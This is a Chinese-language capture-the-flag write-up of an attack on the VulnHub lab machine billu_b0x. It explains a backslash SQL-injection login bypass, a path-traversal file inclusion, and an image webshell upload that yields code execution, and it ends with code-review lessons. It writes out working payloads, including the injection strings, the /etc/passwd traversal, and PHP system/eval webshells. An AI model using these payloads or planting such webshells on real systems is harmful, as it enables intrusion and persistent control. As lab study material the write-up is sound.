# Attack Report -- billu_b0x

## 目标概览
- 靶机：VulnHub billu_b0x
- 服务：HTTP（80）—— 根据应用代码推断；本目录未保存 nmap 扫描工件
- 技术栈：PHP + MySQL（mysqli），应用名 `ica_lab`
- 当前权限：www-data（Web 服务账户）
- 攻击结果：已获得 RCE，尚未提权至 root

## 工件清单

本目录下收集的文件，按性质分类：

| 文件 | 性质 | 说明 |
|------|------|------|
| `index.php` | 应用源码 | 登录页，含 SQL 注入 |
| `c.php` | 应用源码 | 数据库配置，硬编码凭据 |
| `head.php` | 应用源码 | 页面样式 |
| `panel.php` | 应用源码 | 登录后面板，含 LFI + 文件上传 |
| `add.php` / `show.php` | 应用源码 | 添加用户 / 显示用户表单 |
| `in.php` / `test.php` | 应用源码 | `phpinfo()`，信息泄露 |
| `passwd` | 系统文件 | `/etc/passwd`，经 LFI 读出 |
| `2.php` | 攻击载荷 | `<?php @eval($_GET['cmd']);?>`，落地用 webshell |
| `3.jpg` | 攻击载荷 | 图片马——合法 JPEG + 追加 `<?php system($_GET['cmd']);?>` |
| `1.jpg` | 普通图片 | 未嵌入 PHP，疑似测试上传或展示用图 |

关键核验：`3.jpg` 是真实的 JPEG（`file` 识别为 450x450 baseline JPEG），尾部附有 `<?php system($_GET['cmd']);?>`，这是绕过上传校验的核心。

## 攻击链

```
侦察 (HTTP 80)
  -> SQL 注入登录绕过 (index.php, 反斜杠续行)
  -> 进入 panel.php
  -> 上传图片马 3.jpg (绕过扩展名 + MIME 双校验)
  -> LFI 包含 uploaded_images/3.jpg (include 忽略扩展名, 执行其中 PHP)
  -> RCE (www-data)
  -> 命令执行: 读 /etc/passwd、cat 全部源码、写入 2.php 持久化 webshell
  -> [未完成] 提权至 root
```

## 漏洞剖析

### 1. 认证绕过 -- index.php SQL 注入（反斜杠续行）

**根因**：开发者用 `str_replace('\'','',...)` 过滤单引号，以为去掉引号就无法逃逸字符串。但忽略了 MySQL 字符串字面量中反斜杠 `\` 是转义字符——它能转义紧随其后的闭合引号，使字符串"吞掉"原本的语法结构。

```php
$uname=str_replace('\'','',urldecode($_POST['un']));
$pass =str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
```

**Payload**：`ps = \`（单反斜杠），`un = " or 1=1#"`

拼出的查询：

```sql
select * from auth where  pass='\' and uname=' or 1=1#'
```

MySQL 解析过程：

- `pass='` 开字符串
- `\'` ——反斜杠转义了本该闭合的引号，引号变成字面量，字符串未闭合
- ` and uname=` 仍位于字符串内部
- 下一个 `'` 才闭合字符串，串值为 `' and uname=`
- ` or 1=1` 落在 SQL 语法层
- `#'` 注释掉尾部

等价于 `WHERE pass='...' or 1=1` -> 恒真 -> 返回所有行 -> `$_SESSION['logged']=true` -> 登录成功。

> 关键点：`str_replace` 只删 `'`，但真正决定字符串边界的是 `\`。黑名单漏掉转义符，整个防护形同虚设。`panel.php` 只校验 `$_SESSION['logged']`，因此拿到 `logged=true` 即可进入面板。

### 2. 本地文件包含 -- panel.php LFI

**根因**：`str_replace('./','',...)` 的清洗结果 `$choice` 只用在 `add`/`show` 两个分支，`else` 分支直接用了未清洗的原始输入 `$_POST['load']`。

```php
$choice=str_replace('./','',$_POST['load']);
if($choice==='add')  { include($dir.'/'.$choice.'.php'); die(); }
if($choice==='show') { include($dir.'/'.$choice.'.php'); die(); }
else                 { include($dir.'/'.$_POST['load']); }   // 原始输入
```

两个缺陷叠加：

1. **else 用原始输入**——`str_replace` 形同虚设，根本没作用到关键路径。
2. **仅过滤 `./`，未过滤 `../`**——`../` 经 `str_replace('./','')` 后仍是 `../`（`./` 是点斜杠，`../` 是点点斜杠，不匹配）。目录穿越畅通。

**Payload**：

- `load=../../../../etc/passwd` -> 读纯文本文件（`include` 遇无 PHP 标签的文件会原样输出）
- `load=uploaded_images/3.jpg` -> 执行图片马（见下节）

> 补充（推断）：通过 `include` 读 PHP 源码通常用 `php://filter/convert.base64-encode/resource=`，但本代码 `include($dir.'/'.$_POST['load'])` 强制加了 `getcwd().'/'` 前缀，使路径不以 `php://` 开头，流封装失效。因此本目录收集到的全套 PHP 源码，更可能是拿到 RCE 后用 `cat` 读出的，而非 LFI 直接读源码。本地保存时间戳不能完全反映实际攻击顺序，此点仅作推断。

### 3. 文件上传 + LFI -> RCE（图片马）

`panel.php` 的上传逻辑有三道校验，但都可绕过：

```php
$r=pathinfo($_FILES['image']['name'],PATHINFO_EXTENSION);  // 取最后一个扩展名
$image=array('jpeg','jpg','gif','png');
if(in_array($r,$image)) {                                  // 扩展名白名单
    $filetype = $finfo->file($_FILES['image']['tmp_name']);
    if(preg_match('/image\/(jpeg|png|gif)/',$filetype)) {  // MIME 魔数校验
        move_uploaded_file(..., 'uploaded_images/'.$_FILES['image']['name']); // 原名落盘
```

绕过链：

| 校验 | 绕过方式 |
|------|---------|
| 扩展名白名单 | `3.jpg` 本身就是 `.jpg`，合法 |
| MIME 魔数 | 文件头是真 JPEG，`finfo` 识别为 `image/jpeg` |
| 文件名 | 未重命名、未随机化，原名落盘，路径可控 |

**关键机制**：`include()` 不关心文件扩展名，只要内容含 `<?php ... ?>` 标签就会执行。因此：

1. 上传 `3.jpg`（合法 JPEG 头 + 尾部 `<?php system($_GET['cmd']);?>`）-> 通过双校验 -> 落盘 `uploaded_images/3.jpg`
2. LFI：`POST load=uploaded_images/3.jpg` -> `include('/var/www/uploaded_images/3.jpg')` -> 执行 `system($_GET['cmd'])` -> **RCE**

> `2.php`（`eval` 型 webshell）扩展名为 `.php`，无法直接上传（会被白名单拦）。它更可能是拿到 RCE 后通过 `system` 写入 web 根目录的持久化后门——`eval` 比 `system` 更灵活，便于后续操作。

### 4. 信息泄露

- **`c.php` 硬编码凭据**：`mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab")` -- 数据库账号 `billu:b0x_billu`，库名 `ica_lab`。
- **`in.php` / `test.php` = phpinfo**：泄露完整 PHP 配置、绝对路径、已加载模块，为后续利用提供情报。
- **`/etc/passwd`**：确认系统真实用户 `ica`（uid 1000，`/bin/bash`），其余为服务账户；密码哈希在 `/etc/shadow`（root 才可读），故需提权。

## 凭据与权限

- 已获取凭据：数据库 `billu:b0x_billu`（库 `ica_lab`，含 `auth`、`users` 表）
- 当前权限：www-data

## 下一步

1. **利用数据库凭据**：用 `billu:b0x_billu` 连接 MySQL（若 3306 对外，或经本地 RCE），dump `auth` 表 -> 可能拿到后台账号密码 -> 尝试与系统用户 `ica` 的密码复用（`su ica` 或 SSH）。
2. **提权至 root**：拿到 `ica` 后再做本地提权（常见方向：SUID 二进制、可写 `/etc/passwd`、内核漏洞、`sudo -l`）。这是本靶机目前留空的一环。

## 经验沉淀

- **黑名单的致命盲区**：过滤引号却放过转义符 `\`，等于没过滤。安全边界处的函数行为（此处是 MySQL 字符串转义规则）必须二次确认，不能只看过滤了什么字符。
- **include 忽略扩展名**：上传校验再严，只要存在任意 `include` 点能把上传文件包含进来，图片马即可触发 RCE。上传校验与文件包含是两个独立漏洞，组合后危害倍增。
- **清洗逻辑未覆盖所有分支**：`str_replace` 只作用到 `add`/`show` 分支，`else` 用原始输入，典型的"修了一半"。代码审计时要核对每个 sink 是否都经过同等清洗。
- **`./` 过滤绕过**：`str_replace('./','')` 无法清除 `../`，目录穿越过滤应使用白名单或递归替换。
